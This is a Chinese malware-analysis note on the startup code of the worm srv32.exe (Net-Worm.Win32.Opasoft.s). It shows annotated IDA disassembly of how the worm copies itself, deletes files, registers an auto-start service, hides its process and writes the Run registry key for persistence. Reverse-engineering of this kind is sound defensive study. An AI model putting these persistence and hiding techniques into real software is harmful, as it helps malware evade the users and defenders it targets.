

# 蠕虫 srv32.exe 逆向分析笔记 1 -- 启动篇

> 原文：[`www.pediy.com/kssd/pediy07/pediy7-152.htm`](https://www.pediy.com/kssd/pediy07/pediy7-152.htm)

文件名称：srv32.exe  
蠕虫名称：Net-Worm.Win32.Opasoft.s  
工具：   IDA 4.5.1, OllyDbg V1.10  
  
脱壳，用 IDA 反汇编，到程序的开始位置：  
  
CODE:00401000 start           proc near  
CODE:00401000                 enter   314h, 0  
CODE:00401004                 lea     eax, \[ebp+ExistingFileName\] ; 存储病毒路径＋名称  
CODE:0040100A                 push    100h            ; nSize  
CODE:0040100F                 push    eax             ; lpFilename  
CODE:00401010                 push    0               ; hModule  
CODE:00401012                 call    GetModuleFileNameA ; 获得病毒的路径名称  
CODE:00401017                 call    GetCommandLineA  
CODE:0040101C                 mov     esi, eax  
  
;程序首先调用 GetModuleFileNameA 和 GetCommandLineA 得到程序所在路径，文件名称和参数信息。  
  
  
CODE:0040101E                 cld  
CODE:0040101F                 mov     ah, 20h  
CODE:00401021                 lodsb                     
;把 DS:\[ESI\]指向的字节存到 AL 中,即第一个字符,这里 ESI 指向命令行字符串  
  
CODE:00401022                 cmp     al, 22h         ; 比较 ESI 指向的第一个字符是否是：双引号  
CODE:00401024                 jnz     short loc\_401028 ; 在这里没有跳转  
CODE:00401026                 mov     ah, al  
  
CODE:00401028 loc\_401028:  
CODE:00401028                 lodsb  
CODE:00401029                 test    al, al  
CODE:0040102B                 jz      short loc\_40105C ; 判断是否到命令行字符串的结束符  
CODE:0040102D                 cmp     al, ah          ; 比较  
CODE:0040102F                 jnz     short loc\_401028  
  
;找下一个 双引号 出现的位置，即定位到命令行的程序名称末尾，再往后可能就是参数了  
  
CODE:00401031 loc\_401031:     lodsb  
CODE:00401032                 test    al, al          ; 判断是否到命令行字符串的结束符  
CODE:00401034                 jz      short loc\_40105C  
CODE:00401036                 cmp     al, 20h  
CODE:00401038                 jz      short loc\_401031  
  
;取第二此出现双引号以后的第一个非空格字符，当然是参数了  
  
CODE:0040103A                 and     al, 0DFh        ; 小写字母转换成大写字母  
CODE:0040103C                 cmp     al, 55h         ; 命令行参数－'U'  
CODE:0040103E                 jz      loc\_401107  
CODE:00401044                 cmp     al, 44h         ; 参数'D'  
CODE:00401046                 jz      loc\_401165  
CODE:0040104C                 cmp     al, 43h         ; 参数'C'  
CODE:0040104E                 jz      loc\_401170  
CODE:00401054                 cmp     al, 53h         ; 参数'S'  
CODE:00401056                 jz      loc\_4011DA  
  
;把参数转换成大写，跳到相应的处理代码，如果没有参数就继续执行，我们先看有参数的情况  
先来看参数 U 吧，用 OllyDbg 打开 Srv32.exe,选择菜单调试->参数，加上参数 u，找到 loc\_401107，按 F4 执行到：  
  
CODE:00401107 loc\_401107:  
CODE:00401107                 push    esi             ;耶，怎么用 ESI，esi 已经指向命令行字符串的末尾  
了啊？先不管看看下面做什么操作  
CODE:00401108                 call    sub\_40132B      ;调用了个子程序进去看看  
CODE:0040110D                 lea     eax, \[ebp+ExistingFileName\]  
CODE:00401113                 push    0               ; bFailIfExists  
CODE:00401115                 push    esi             ; lpNewFileName  
CODE:00401116                 push    eax             ; lpExistingFileName  
CODE:00401116                                         ; 病毒路径＋名称  
CODE:00401117                 call    CopyFileA  
CODE:0040111C                 test    eax, eax  
  
  
CODE:0040132B sub\_40132B      proc near  
CODE:0040132F loc\_40132F:  
CODE:0040132F                 push    \[ebp+lpFileName\] ;？这里的文件名为空（PUSH ESI）  
CODE:00401332                 call    DeleteFileA  ;删除文件，文件名为空，搞什么鬼  
CODE:00401337                 test    eax, eax  
CODE:00401339                 jnz     short locret\_401351 ;DeleteFileA 成功退出 Sub\_40132B  
CODE:0040133B                 call    GetLastError    ;在这里我们返回值为 3（系统找不到指定的路径）  
CODE:00401340                 cmp     eax, 2          ; 找不到指定文件  
CODE:00401343                 jz      short locret\_401351 ; 退出  
CODE:00401345                 push    3E8h            ; dwMilliseconds  
CODE:0040134A                 call    Sleep  
CODE:0040134F                 jmp     short loc\_40132F ;程序在这里一直循环，难道是 BUG,不会吧？  
CODE:00401351 locret\_401351:                            
CODE:00401351                 leave  
CODE:00401352                 retn    4  
CODE:00401352 sub\_40132B      endp  
  
;sub\_40132B 是一段删除文件的操作，而文件名就是\[esi\]，看来参数 U 后面还得加上个文件名，我们把参数改成  
uabc.txt,继续往下看  
从 sub\_40132B 出来：  
  
CODE:0040110D                 lea     eax, \[ebp+ExistingFileName\]  
CODE:00401113                 push    0               ; bFailIfExists  
CODE:00401115                 push    esi             ; lpNewFileName  
CODE:00401116                 push    eax             ; lpExistingFileName  
CODE:00401116                                         ; 病毒路径＋名称  
CODE:00401117                 call    CopyFileA  
CODE:0040111C                 test    eax, eax  
CODE:0040111E                 jz      loc\_401218      ; CopyFile 失败跳转  
  
把病毒拷贝到新的路径，哦，U 后面的参数是拷贝病毒的位置和新的名字，如果这个新的路径有这个文件就~~~~~  
~~调用 sub\_40132B 函数删除这个文件（真狠啊！）  
现在知道 sub\_40132B 的作用了，好咱们继续往下走。  
  
CODE:00401124                 lea     edi, \[ebp+var\_300\]  
CODE:0040112A                 push    esi  
CODE:0040112B                 push    edi  
CODE:0040112C                 call    lstrcpy         ; 把病毒新的路径和文件名存到\[ebp+300\]  
CODE:00401131                 push    edi  
CODE:00401132                 call    lstrlen  
CODE:00401137                 add     edi, eax  
CODE:00401139                 mov     ax, 4420h  
CODE:0040113D                 stosw                   ; 存储 0x4420  
CODE:0040113F                 lea     eax, \[ebp+ExistingFileName\]  
CODE:00401145                 push    eax  
CODE:00401146                 push    edi  
CODE:00401147                 call    lstrcpy  
CODE:0040114C                 lea     eax, \[ebp+var\_300\] ; NewFileName + 0x4420 + ExistingFileName  
CODE:00401152                 push    eax  
CODE:00401153                 call    sub\_4013A8      ; 这个函数创建了一个进程  
CODE:00401158                 test    eax, eax        ; eax 为 CreateProcessA 返回值  
CODE:0040115A                 jnz     locret\_40123C   ; 创建进程成功跳转，执行新进程，退出此程序  
CODE:00401160                 jmp     loc\_401218  
  
这段代码中 srv32 通过调用 CreateProcess 创建了一个进程，新进程的执行文件就是上面 CopyFile 函数拷贝出的  
srv32 的一个拷贝。  
如果创建进程成功就执行新的进程，退出 srv32；否则跳转到如下位置：  
  
CODE:00401218 loc\_401218:  
CODE:00401218                 push    offset aKernel32\_dll ; lpModuleName  
CODE:0040121D                 call    GetModuleHandleA  
CODE:00401222                 push    offset aRegisterservic ; lpProcName  
CODE:00401227                 push    eax             ; hModule  
CODE:00401228                 call    GetProcAddress  ; 获得 RegisterServiceProcess(Win9x 函数)地址  
CODE:0040122D                 test    eax, eax  
CODE:0040122F                 jz      short loc\_401237  
CODE:00401231                 push    1               ; dwType:  
CODE:00401231                                         ; RSP\_SIMPLE\_SERVICE = 1 隐藏进程  
CODE:00401231                                         ; RSP\_UNREGISTER\_SERVICE = 0 取消进程隐藏  
CODE:00401231                                         ;   
CODE:00401233                 push    0               ; dwPID = NULL 代表当前进程  
CODE:00401235                 call    eax             ; 调用 RegisterServiceProcess 函数  
CODE:00401237   
CODE:00401237 loc\_401237:  
CODE:00401237                 call    sub\_40123E  
CODE:0040123C   
CODE:0040123C locret\_40123C:  
CODE:0040123C                 leave  
CODE:0040123D                 retn  
CODE:0040123D start           endp  
  
;如果创建进程没有成功，调用 RegisterServiceProcess 函数来隐藏进程，最后调用 sub\_40123E。  
  
;注：RegisterServiceProcess 是 Win9x 中一个未公开的 API 函数，调用时需要通过 GetProcAddress 得到其地址，  
;参数 dwType 为 1 时隐藏进程，为 1 时取消隐藏，参数 dwPID 为进程的 PID，为零则表示当前进程。  
  
  
再看下一个参数'D':  
  
CODE:00401165 loc\_401165:  
CODE:00401165                 push    esi  
CODE:00401166                 call    sub\_40132B  
CODE:0040116B                 jmp     loc\_401218  
;和参数 'U' 一样也调用了 sub\_40132B，只是少了 CopyFile 的动作，直接跳转到了 RegisterServiceProcess  
;看来 D 就是用来删除指定文件的  
  
  
  
继续参数'C':  
  
:00401170 loc\_401170:  
CODE:00401170                 call    sub\_401355      ; 调用了 GetProcAddress 得到 OpenSCManager..  
                                                      ;等函数的地址  
CODE:00401175                 test    eax, eax        ; 返回 1 函数 Sub\_401355 调用成功，0 失败。  
CODE:00401177                 jz      loc\_401218      ; 失败则跳转  
  
;用参数'C'时，调用了下面的函数 sub\_401355  
  
CODE:00401355 sub\_401355      proc near  
CODE:00401355 hModule         = dword ptr -8  
CODE:00401355 var\_4           = dword ptr -4  
CODE:00401355                 enter   8, 0  
CODE:00401359                 push    edi  
CODE:0040135A                 mov     \[ebp+var\_4\], 0  
CODE:00401361                 push    offset aAdvapi32 ; lpLibFileName  
CODE:00401366                 call    LoadLibraryA  
CODE:0040136B                 test    eax, eax  
CODE:0040136D                 jz      short loc\_4013A2 ; 调用 LoadLibrary 失败时跳转  
CODE:0040136F                 mov     \[ebp+hModule\], eax  
CODE:00401372                 mov     edi, offset aOpenscmanagera ; "OpenSCManagerA"  
CODE:00401377                 mov     esi, offset dword\_406193  
CODE:0040137C   
CODE:0040137C loc\_40137C:  
CODE:0040137C                 push    edi             ; lpProcName  
CODE:0040137D                 push    \[ebp+hModule\]   ; hModule  
CODE:00401380                 call    GetProcAddress  ; 获得函数 Advapi32!OpenSCManagerA 的地址  
CODE:00401385                 test    eax, eax  
CODE:00401387                 jz      short loc\_4013A2 ; 调用 GetProcAddress 失败时跳转  
CODE:00401389                 mov     \[esi\], eax      ; 把 OpenSCManager 的地址存到\[ESI\]中  
CODE:0040138B                 add     esi, 4  
CODE:0040138E                 xor     eax, eax  
CODE:00401390                 xor     ecx, ecx  
CODE:00401392                 not     ecx  
CODE:00401394                 repne scasb  
CODE:00401396                 cmp     byte ptr \[edi\], 0  
CODE:00401399                 jnz     short loc\_40137C ; 循环，取  
CODE:00401399                                   ; 00406127 aCreateservicea db 'CreateServiceA'  
CODE:00401399                                   ; 00406136 aCloseserviceha db 'CloseServiceHandle'  
CODE:00401399                                   ; 00406149 aStartservicect db 'StartServiceCtrlDispatcherA'  
CODE:00401399                                   ; 00406165 aRegisterserv\_0 db 'RegisterServiceCtrlHandlerA'  
CODE:00401399                                   ; 00406181 aSetservicestat db 'SetServiceStatus',0  
CODE:00401399                                         ; 函数的地址  
CODE:0040139B                 mov     \[ebp+var\_4\], 1  ; 修改返回值  
CODE:004013A2   
CODE:004013A2 loc\_4013A2:  
CODE:004013A2                 mov     eax, \[ebp+var\_4\] ; 成功返回值 1，失败返回 0  
CODE:004013A5                 pop     edi  
CODE:004013A6                 leave  
CODE:004013A7                 retn  
CODE:004013A7 sub\_401355      endp  
  
;函数 sub\_401355 又调用了 API 函数 LoadLibrary("Advapi32")得到 Advapi32 的模块句柄，然后又循环调用了  
GetProcAddress 得到 OpenSCManagerA, CreateServiceA, CloseServiceHandle,   
StartServiceCtrlDispatcherA, RegisterServiceCtrlHandlerA,SetServiceStatus 这些函数的地址。  
然后就调用 OpenSCManager,CreateServiceA,创建一个服务 srv32 指向 srv32 程序，启动参数为'S'  
如下代码：  
  
CODE:0040117D                 push    2  
CODE:0040117F                 push    0               ; SERVICES\_ACTIVE\_DATABASE  
CODE:00401181                 push    0               ; LocalMachine  
CODE:00401183                 call    ds:dword\_406193 ; OpenSCManager 函数  
CODE:00401189                 test    eax, eax  
CODE:0040118B                 jz      loc\_401218      ; OpenSCManager 失败则跳转  
CODE:00401191                 mov     esi, eax        ; handle of service control manager database  
CODE:00401193                 lea     edi, \[ebp+ExistingFileName\] ; 病毒路径+文件名  
CODE:00401199                 push    edi  
CODE:0040119A                 call    lstrlen         ; （病毒路径＋文件名）的长度  
CODE:0040119F                 mov     edx, edi  
CODE:004011A1                 add     edi, eax  
CODE:004011A3                 mov     eax, 5320h  
CODE:004011A8                 stosd                   ; 存储 0x5320h = " S"  
CODE:004011A9                 xor     ecx, ecx  
CODE:004011AB                 push    ecx  
CODE:004011AC                 push    ecx  
CODE:004011AD                 push    ecx  
CODE:004011AE                 push    ecx  
CODE:004011AF                 push    ecx  
CODE:004011B0                 push    edx             ; "ExistingFileName" + " S"  
CODE:004011B1                 push    1               ; dwErrorControl = SERVICE\_ERROR\_NORMAL  
CODE:004011B3                 push    2               ; dwStartType = SERVICE\_AUTO\_START   
CODE:004011B3                                         ; 自动启动  
CODE:004011B5                 push    10h             ; dwServiceType =  
CODE:004011B5                                         ; SERVICE\_WIN32\_OWN\_PROCESS  
CODE:004011B7                 push    0F01FFh         ; dwDesiredAccess  
CODE:004011BC                 push    offset aSrv32\_0 ; lpDisplayName = "srv32"  
CODE:004011C1                 push    offset aSrv32\_0 ; lpServiceName = "srv32"  
CODE:004011C6                 push    esi             ; handle of service control manager database  
CODE:004011C7                 call    ds:dword\_406197 ; CreateServiceA 函数  
CODE:004011CD                 test    eax, eax  
CODE:004011CF                 jz      short loc\_401218  
CODE:004011D1                 push    eax  
CODE:004011D2                 call    ds:dword\_40619B ; CloseServiceHandle 函数  
CODE:004011D8                 jmp     short loc\_401218  
  
;最后跳转到 loc\_401218 调用 RegsterServiceProcess 隐藏进程，再调用 sub\_40123E  
  
  
再看参数'S':  
  
CODE:004011DA loc\_4011DA:  
CODE:004011DA                 call    sub\_401355  
CODE:004011DF                 test    eax, eax  
CODE:004011E1                 jz      short loc\_401218 ; 函数 sub\_401355 失败跳转  
CODE:004011E3                 mov     \[ebp+var\_314\], offset aSrv32\_0 ; "Srv32"  
CODE:004011ED                 mov     \[ebp+var\_310\], offset loc\_401467  
CODE:004011F7                 xor     eax, eax  
CODE:004011F9                 mov     \[ebp+var\_30C\], eax  
CODE:004011FF                 mov     \[ebp+var\_308\], eax  
CODE:00401205                 lea     eax, \[ebp+var\_314\]  
CODE:0040120B                 push    eax  
CODE:0040120C                 call    ds:dword\_40619F ; StartServiceCtrlDispatcherA  
CODE:00401212                 test    eax, eax  
CODE:00401214                 jnz     short locret\_40123C ; StartServiceCtrlDispatcherA 调用成功跳转  
CODE:00401216                 jmp     short loc\_401218  
  
同样也调用了函数 sub\_401355 来得到 OpenSCManager, StartServiceCtrlDispatcherA 等函数的地址，随后调用  
StartServiceCtrlDispatcherA(这个函数应该是来启动有参数'C'创建的服务的，具体大家还是看一下 MSDN 吧。)  
如果启动服务失败就隐藏进程后调用 sub\_40123E。  
  
上面都是一些加了参数的启动方式，但是一般病毒第一次启动时可能是没有参数的，因为第一次启动最可能就是  
不小心双击了被感染程序，所以我们再看看没有参数时 srv32 的启动过程是什么样子的。  
  
  
CODE:0040105C loc\_40105C:  
CODE:0040105C                 call    GetVersion  
CODE:00401061                 bt      eax, 1Fh        ; 测试最高位（31 bit）是否为 1，1 为 win9x 平台  
CODE:00401065                 jnb     loc\_401218      ; 0 为 NT 平台,最高位为 0（CF = 0）时跳转，  
CODE:00401065                                         ; 也就是系统为 NT 平台时跳转到 loc\_401218 执行  
CODE:00401065                                         ; RegisterServiceProcess 隐藏进程  
CODE:0040106B                 lea     edi, \[ebp+ExistingFileName\]  
  
首先调用 GetVersion API 函数得到操作系统平台信息，如果为 NT 平台跳转到 loc\_401218，再调用 sub\_40123E。  
如果为 9x 平台，继续往下执行...  
  
  
CODE:0040106B                 lea     edi, \[ebp+ExistingFileName\]  
CODE:00401071                 push    edi  
CODE:00401072                 call    lstrlen         ; 计算文件名+路径的长度  
CODE:00401077                 mov     ecx, eax  
CODE:00401079                 add     edi, eax  
CODE:0040107B                 dec     edi  
CODE:0040107C                 mov     al, 5Ch  
CODE:0040107E                 std  
CODE:0040107F                 repne scasb  
CODE:00401081                 cld  
CODE:00401082                 add     edi, 2          ; 定位文件名  
CODE:00401085                 push    offset aNew\_exe ; "new.exe"  
CODE:0040108A                 push    edi  
CODE:0040108B                 call    lstrcmpi        ; 不区分大小写比较  
CODE:00401090                 test    eax, eax  
CODE:00401092                 jnz     loc\_401218      ; 文件名不是"new.exe"则跳转  
  
这里不知道为什么和"new.exe"比较？？？  
我得文件名是 srv32.exe 当然就跳转的 loc\_401218 然后调用 sub\_40123E，  
如果文件名是 new.exe 则执行下面的代码  
  
CODE:00401098                 lea     esi, \[ebp+Buffer\]  
CODE:0040109E                 push    100h            ; uSize  
CODE:004010A3                 push    esi             ; lpBuffer  
CODE:004010A4                 call    GetWindowsDirectoryA  
CODE:004010A9                 push    esi  
CODE:004010AA                 call    lstrlen  
CODE:004010AF                 add     eax, esi  
CODE:004010B1                 push    offset aSrv32\_exe ; "\\\\Srv32.exe"  
CODE:004010B6                 push    eax  
CODE:004010B7                 call    lstrcpy  
CODE:004010BC                 lea     eax, \[ebp+hKey\]  
CODE:004010C2                 push    eax             ; phkResult  
CODE:004010C3                 push    3               ; samDesired  
CODE:004010C5                 push    0               ; ulOptions  
CODE:004010C7                 push    offset aSoftwareMicros ; lpSubKey  
CODE:004010CC                 push    80000002h       ; HKLM  
CODE:004010D1                 call    RegOpenKeyExA  
CODE:004010D6                 cmp     eax, 0  
CODE:004010D9                 jnz     loc\_401218  
CODE:004010DF                 push    esi  
CODE:004010E0                 call    lstrlen  
CODE:004010E5                 inc     eax  
CODE:004010E6                 push    eax             ; cbData  
CODE:004010E7                 push    esi             ; lpData  
CODE:004010E8                 push    1               ; dwType  
CODE:004010EA                 push    0               ; Reserved  
CODE:004010EC                 push    offset aSrv32   ; lpValueName  
CODE:004010F1                 push    \[ebp+hKey\]      ; hKey  
CODE:004010F7                 call    RegSetValueExA  
CODE:004010FC                 push    \[ebp+hKey\]      ; hKey  
CODE:00401102                 call    RegCloseKey  
  
写注册表 HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 项，用处不用说了吧^\_^  
  
  
CODE:00401107   
CODE:00401107 loc\_401107:  
CODE:00401107                 push    esi             ; 指定病毒被复制到的路径和文件名,用参数 U  
CODE:00401108                 call    sub\_40132B      ; 删除指定文件  
CODE:0040110D                 lea     eax, \[ebp+ExistingFileName\]  
CODE:00401113                 push    0               ; bFailIfExists  
CODE:00401115                 push    esi             ; lpNewFileName  
CODE:00401116                 push    eax             ; lpExistingFileName  
CODE:00401116                                         ; 病毒路径＋名称  
CODE:00401117                 call    CopyFileA  
CODE:0040111C                 test    eax, eax  
CODE:0040111E                 jz      loc\_401218      ; CopyFile 失败跳转  
  
把 srv32 复制到 windows 目录下  
  
CODE:00401124                 lea     edi, \[ebp+var\_300\]  
CODE:0040112A                 push    esi  
CODE:0040112B                 push    edi  
CODE:0040112C                 call    lstrcpy         ; 把病毒新的路径和文件名存到\[ebp+300\]  
CODE:00401131                 push    edi  
CODE:00401132                 call    lstrlen  
CODE:00401137                 add     edi, eax  
CODE:00401139                 mov     ax, 4420h  
CODE:0040113D                 stosw                   ; 存储 0x4420 = " D"  
CODE:0040113F                 lea     eax, \[ebp+ExistingFileName\]  
CODE:00401145                 push    eax  
CODE:00401146                 push    edi  
CODE:00401147                 call    lstrcpy  
CODE:0040114C                 lea     eax, \[ebp+var\_300\] ; NewFileName + 0x4420 + ExistingFileName  
CODE:00401152                 push    eax  
CODE:00401153                 call    sub\_4013A8      ; 这个函数创建了一个进程  
CODE:00401158                 test    eax, eax        ; eax 为 CreateProcessA 返回值  
CODE:0040115A                 jnz     locret\_40123C   ; 创建进程成功跳转，执行新进程，退出此程序  
CODE:00401160                 jmp     loc\_401218  
  
然后创建一个进程，带参数'D'执行，参数'd'后面跟的是 srv32.exe ,即执行 windows 目录下的程序后，删除自  
身，最后也是跳转到 loc\_401218,再调用 sub\_40123E  
  
到这里 srv32 的前期工作已经做好了，下面就快搞破坏了

 4dd466d0e1e0cc123afbe504da2462ca